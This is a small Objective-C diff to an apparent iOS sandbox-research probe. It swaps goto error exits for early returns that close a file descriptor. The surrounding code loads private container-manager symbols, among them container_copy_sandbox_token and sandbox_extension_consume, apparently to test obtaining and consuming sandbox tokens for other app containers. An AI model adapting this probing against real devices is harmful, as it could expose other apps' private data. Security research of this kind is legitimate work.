@@ -97,7 +97,11 @@ static void Lf(NSString *fmt, ...) {
         LabLocalMilitaryNow(), P173_BUILD, [LabDeviceProfile identBlock]];
     Lf(@"%@", head); [out appendString:head];
 
-    if (@available(iOS 17.0, *)) {} else { Lf(@"[-] iOS 17+ only"); goto done; }
+    if (@available(iOS 17.0, *)) {} else {
+        Lf(@"[-] iOS 17+ only");
+        if (g_fd >= 0) { close(g_fd); g_fd = -1; }
+        return out;   /* no goto: the done label sits past initializers (CI error 65) */
+    }
 
     NSString *group = [self p173_appGroup];
     Lf(@"[*] app groups (dynamic entitlement read): %@", group ?: @"NONE");
@@ -107,7 +111,11 @@ static void Lf(NSString *fmt, ...) {
     }
 
     void *h = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_LAZY);
-    if (!h) { Lf(@"[-] libsystem_containermanager not loadable"); goto done; }
+    if (!h) {
+        Lf(@"[-] libsystem_containermanager not loadable");
+        if (g_fd >= 0) { close(g_fd); g_fd = -1; }
+        return out;
+    }
     p173_q_create_t qCreate = (p173_q_create_t)dlsym(h, "container_query_create");
     p173_q_setclass_t qClass = (p173_q_setclass_t)dlsym(h, "container_query_set_class");
     p173_q_setgroup_t qGroup = (p173_q_setgroup_t)dlsym(h, "container_query_set_group_identifiers");
@@ -117,7 +125,9 @@ static void Lf(NSString *fmt, ...) {
     p173_q_token_t qToken = (p173_q_token_t)dlsym(h, "container_copy_sandbox_token");
     p173_consume_t consume = (p173_consume_t)dlsym(h, "sandbox_extension_consume");
     if (!qCreate || !qClass || !qResult || !qToken || !consume) {
-        Lf(@"[-] container_query symbols missing"); goto done;
+        Lf(@"[-] container_query symbols missing");
+        if (g_fd >= 0) { close(g_fd); g_fd = -1; }
+        return out;
     }
     Lf(@"[*] container_query symbol set complete");
 
